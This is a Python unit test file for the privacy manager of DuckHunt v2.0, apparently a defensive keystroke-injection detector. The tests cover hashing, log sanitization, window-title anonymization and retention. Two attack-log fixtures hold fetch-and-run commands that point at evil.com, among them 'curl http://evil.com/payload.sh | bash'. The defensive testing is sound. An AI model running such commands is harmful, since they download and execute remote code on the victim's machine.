"""
Unit tests for DuckHunt v2.0 Privacy Manager

Tests data minimization, hashing, and privacy safeguards.
"""

import unittest
import sys
import os
import json
import hashlib
from datetime import datetime, timedelta

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.privacy import PrivacyManager


class TestPrivacyManager(unittest.TestCase):
    """Test suite for PrivacyManager"""

    def setUp(self):
        """Set up test fixtures"""
        self.privacy = PrivacyManager(
            anonymize_logs=True,
            store_window_names=False,
            log_retention_days=7
        )

    def test_content_hashing(self):
        """Test that content is hashed correctly"""
        content = "password123"
        hashed = self.privacy.hash_content(content)

        # Should be SHA256 format
        self.assertTrue(hashed.startswith('SHA256:'))

        # Should be consistent
        hashed2 = self.privacy.hash_content(content)
        self.assertEqual(hashed, hashed2)

        # Different content should produce different hash
        hashed3 = self.privacy.hash_content("different")
        self.assertNotEqual(hashed, hashed3)

    def test_hash_irreversibility(self):
        """Test that hashes cannot be reversed to original content"""
        content = "sensitive_password"
        hashed = self.privacy.hash_content(content)

        # Hash should not contain original content
        self.assertNotIn(content, hashed)

        # Should be 64 hex characters (256 bits)
        hash_part = hashed.split(':')[1]
        self.assertEqual(len(hash_part), 64)

    def test_event_sanitization(self):
        """Test that events are properly sanitized"""
        event = {
            'timestamp': '2025-01-06T12:00:00Z',
            'key': 'p',  # Potentially sensitive
            'inter_event_ms': 145.3,
            'window_name': 'Banking - Account Login',
            'application': 'Firefox',
            'injected': False
        }

        sanitized = self.privacy.sanitize_event(event)

        # Should remove raw key content
        self.assertNotIn('key', sanitized)

        # Should keep timing
        self.assertIn('inter_event_ms', sanitized)

        # Should anonymize window name
        if 'window_name' in sanitized:
            self.assertNotIn('Banking', sanitized['window_name'])
            self.assertNotIn('Login', sanitized['window_name'])
            # Should be categorized
            self.assertIn(sanitized['window_name'], ['BROWSER', 'EDITOR', 'TERMINAL', 'OTHER'])

    def test_window_name_categorization(self):
        """Test window name anonymization to categories"""
        test_cases = [
            ('Firefox - Bank of America', 'BROWSER'),
            ('Google Chrome - Gmail', 'BROWSER'),
            ('Visual Studio Code - passwords.txt', 'EDITOR'),
            ('Terminal - bash', 'TERMINAL'),
            ('cmd.exe', 'TERMINAL'),
            ('notepad.exe - secret.txt', 'EDITOR'),
            ('Unknown Application', 'OTHER')
        ]

        for window_name, expected_category in test_cases:
            category = self.privacy.categorize_window(window_name)
            self.assertEqual(category, expected_category,
                           f"Window '{window_name}' should be '{expected_category}'")

    def test_attack_log_sanitization(self):
        """Test that attack logs are properly sanitized"""
        attack_event = {
            'timestamp': '2025-01-06T14:23:11Z',
            'attack_type': 'speed_anomaly',
            'confidence': 0.92,
            'keystroke_sequence': 'curl -o /tmp/payload http://evil.com/bad.sh',
            'window_name': 'Terminal',
            'action_taken': 'blocked'
        }

        sanitized_log = self.privacy.sanitize_attack_log(attack_event)

        # Should not contain raw keystroke content
        self.assertNotIn('keystroke_sequence', sanitized_log)

        # Should contain hash of content
        self.assertIn('content_hash', sanitized_log)
        self.assertTrue(sanitized_log['content_hash'].startswith('SHA256:'))

        # Should keep metadata
        self.assertEqual(sanitized_log['attack_type'], 'speed_anomaly')
        self.assertEqual(sanitized_log['confidence'], 0.92)

    def test_retention_policy_enforcement(self):
        """Test that old logs are deleted per retention policy"""
        # Create temporary log directory
        import tempfile
        log_dir = tempfile.mkdtemp()

        # Create fake log files with different timestamps
        now = datetime.now()

        # Recent log (within retention period)
        recent_log = os.path.join(log_dir, 'attacks_recent.jsonl')
        with open(recent_log, 'w') as f:
            f.write('{"timestamp": "2025-01-06T12:00:00Z"}\n')

        # Old log (beyond retention period)
        old_log = os.path.join(log_dir, 'attacks_old.jsonl')
        with open(old_log, 'w') as f:
            f.write('{"timestamp": "2025-01-01T12:00:00Z"}\n')

        # Set file modification time to simulate age
        old_time = (now - timedelta(days=30)).timestamp()
        os.utime(old_log, (old_time, old_time))

        # Enforce retention policy (7 days)
        self.privacy.log_retention_days = 7
        self.privacy.enforce_retention_policy(log_dir)

        # Old log should be deleted
        self.assertFalse(os.path.exists(old_log),
                        "Old log file should be deleted")

        # Recent log should remain
        self.assertTrue(os.path.exists(recent_log),
                       "Recent log file should be preserved")

        # Cleanup
        import shutil
        shutil.rmtree(log_dir)

    def test_no_plaintext_passwords_logged(self):
        """Test that plaintext passwords never appear in logs"""
        # Simulate typing a password
        password = "SuperSecret123!"

        # Hash it
        hashed = self.privacy.hash_content(password)

        # Verify plaintext not in hash
        self.assertNotIn(password, hashed)

        # Sanitize event containing password
        event = {
            'key': 'S',
            'window_name': 'Login Form',
            'content': password
        }

        sanitized = self.privacy.sanitize_event(event)

        # Verify password not in sanitized output
        sanitized_str = json.dumps(sanitized)
        self.assertNotIn(password, sanitized_str)

    def test_statistical_data_preservation(self):
        """Test that statistical data is preserved during sanitization"""
        event = {
            'timestamp': '2025-01-06T12:00:00Z',
            'key': 'a',
            'inter_event_ms': 145.3,
            'z_score': 0.5,
            'window_name': 'VSCode'
        }

        sanitized = self.privacy.sanitize_event(event)

        # Statistical data should be preserved
        self.assertEqual(sanitized['inter_event_ms'], 145.3)
        if 'z_score' in sanitized:
            self.assertEqual(sanitized['z_score'], 0.5)

    def test_anonymization_toggle(self):
        """Test that anonymization can be toggled"""
        # Anonymization enabled
        privacy_anon = PrivacyManager(anonymize_logs=True)

        event = {'key': 'a', 'window_name': 'Firefox'}
        sanitized = privacy_anon.sanitize_event(event)

        self.assertNotIn('key', sanitized)

        # Anonymization disabled (for debugging)
        privacy_no_anon = PrivacyManager(anonymize_logs=False)
        event = {'key': 'a', 'window_name': 'Firefox'}
        sanitized = privacy_no_anon.sanitize_event(event)

        # May preserve more data when disabled
        # (Implementation specific)

    def test_window_name_storage_toggle(self):
        """Test that window name storage can be toggled"""
        # Window names disabled (default)
        privacy_no_window = PrivacyManager(store_window_names=False)

        event = {'window_name': 'Banking App - Account 12345'}
        sanitized = privacy_no_window.sanitize_event(event)

        # Should be categorized, not full name
        if 'window_name' in sanitized:
            self.assertNotIn('Account 12345', sanitized['window_name'])

        # Window names enabled
        privacy_with_window = PrivacyManager(store_window_names=True)

        event = {'window_name': 'Banking App'}
        sanitized = privacy_with_window.sanitize_event(event)

        # May preserve window name when enabled
        # (But still should hash sensitive parts)

    def test_hash_collision_resistance(self):
        """Test that similar content produces different hashes"""
        content1 = "password123"
        content2 = "password124"

        hash1 = self.privacy.hash_content(content1)
        hash2 = self.privacy.hash_content(content2)

        self.assertNotEqual(hash1, hash2,
                          "Similar content should produce different hashes")

    def test_hash_algorithm_security(self):
        """Test that SHA256 is used (not weak algorithms)"""
        content = "test"
        hashed = self.privacy.hash_content(content)

        # Should use SHA256
        self.assertTrue(hashed.startswith('SHA256:'))

        # Verify it's actual SHA256
        expected_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
        self.assertIn(expected_hash, hashed)

    def test_empty_content_handling(self):
        """Test handling of empty or null content"""
        # Empty string
        hashed = self.privacy.hash_content("")
        self.assertTrue(hashed.startswith('SHA256:'))

        # None/null should be handled gracefully
        # (Implementation may raise exception or return special value)

    def test_unicode_content_hashing(self):
        """Test hashing of Unicode content"""
        # Unicode password
        content = "пароль密码🔒"
        hashed = self.privacy.hash_content(content)

        # Should hash without error
        self.assertTrue(hashed.startswith('SHA256:'))

        # Should be consistent
        hashed2 = self.privacy.hash_content(content)
        self.assertEqual(hashed, hashed2)

    def test_log_format_compliance(self):
        """Test that sanitized logs are in correct JSON format"""
        attack_event = {
            'timestamp': '2025-01-06T14:23:11Z',
            'attack_type': 'pattern_match',
            'confidence': 0.95,
            'keystroke_sequence': 'malicious command',
            'action_taken': 'blocked'
        }

        sanitized = self.privacy.sanitize_attack_log(attack_event)

        # Should be JSON-serializable
        try:
            json_str = json.dumps(sanitized)
            self.assertIsInstance(json_str, str)
        except Exception as e:
            self.fail(f"Sanitized log not JSON-serializable: {e}")

    def test_gdpr_compliance_data_minimization(self):
        """Test GDPR compliance: data minimization"""
        event = {
            'timestamp': '2025-01-06T12:00:00Z',
            'key': 'p',
            'scan_code': 25,
            'inter_event_ms': 145.3,
            'window_name': 'Gmail - Inbox',
            'application': 'Chrome',
            'user_id': '12345',  # PII
            'ip_address': '192.168.1.1'  # PII
        }

        sanitized = self.privacy.sanitize_event(event)

        # Should not contain PII
        self.assertNotIn('user_id', sanitized)
        self.assertNotIn('ip_address', sanitized)

        # Should not contain keystroke content
        self.assertNotIn('key', sanitized)

        # Should only contain necessary statistical data
        self.assertIn('inter_event_ms', sanitized)

    def test_retention_policy_configurable(self):
        """Test that retention policy is configurable"""
        # 7 days default
        privacy7 = PrivacyManager(log_retention_days=7)
        self.assertEqual(privacy7.log_retention_days, 7)

        # 30 days
        privacy30 = PrivacyManager(log_retention_days=30)
        self.assertEqual(privacy30.log_retention_days, 30)

        # 1 day (minimum)
        privacy1 = PrivacyManager(log_retention_days=1)
        self.assertEqual(privacy1.log_retention_days, 1)


class TestPrivacyCompliance(unittest.TestCase):
    """Test privacy compliance requirements"""

    def test_no_raw_keystroke_storage(self):
        """CRITICAL: Test that raw keystrokes are never stored"""
        privacy = PrivacyManager(anonymize_logs=True)

        # Simulate typing sensitive data
        events = [
            {'key': 'p', 'inter_event_ms': 145},
            {'key': 'a', 'inter_event_ms': 130},
            {'key': 's', 'inter_event_ms': 140},
            {'key': 's', 'inter_event_ms': 135}
        ]

        sanitized_events = [privacy.sanitize_event(e) for e in events]

        # Verify no raw keys in any sanitized event
        for sanitized in sanitized_events:
            self.assertNotIn('key', sanitized,
                           "Raw keystroke found in sanitized event")

    def test_window_title_anonymization(self):
        """CRITICAL: Test that sensitive window titles are anonymized"""
        privacy = PrivacyManager(store_window_names=False)

        sensitive_titles = [
            'Bank of America - Account Ending in 1234',
            'Gmail - Confidential Email',
            'passwords.txt - Notepad',
            'SSH - root@production-server.com'
        ]

        for title in sensitive_titles:
            category = privacy.categorize_window(title)

            # Should not contain sensitive details
            self.assertNotIn('1234', category)
            self.assertNotIn('Confidential', category)
            self.assertNotIn('passwords', category)
            self.assertNotIn('production-server', category)

            # Should be generic category
            self.assertIn(category, ['BROWSER', 'EDITOR', 'TERMINAL', 'OTHER'])

    def test_attack_content_hashing(self):
        """CRITICAL: Test that attack content is hashed, not stored plaintext"""
        privacy = PrivacyManager(anonymize_logs=True)

        attack = {
            'keystroke_sequence': 'curl http://evil.com/payload.sh | bash',
            'attack_type': 'command_injection'
        }

        sanitized = privacy.sanitize_attack_log(attack)

        # Should not contain plaintext attack
        self.assertNotIn('keystroke_sequence', sanitized)

        # Should contain hash
        self.assertIn('content_hash', sanitized)
        self.assertTrue(sanitized['content_hash'].startswith('SHA256:'))


def run_tests():
    """Run all tests"""
    unittest.main(argv=[''], verbosity=2, exit=False)


if __name__ == '__main__':
    print("DuckHunt v2.0 - Privacy Manager Unit Tests")
    print("=" * 60)
    run_tests()
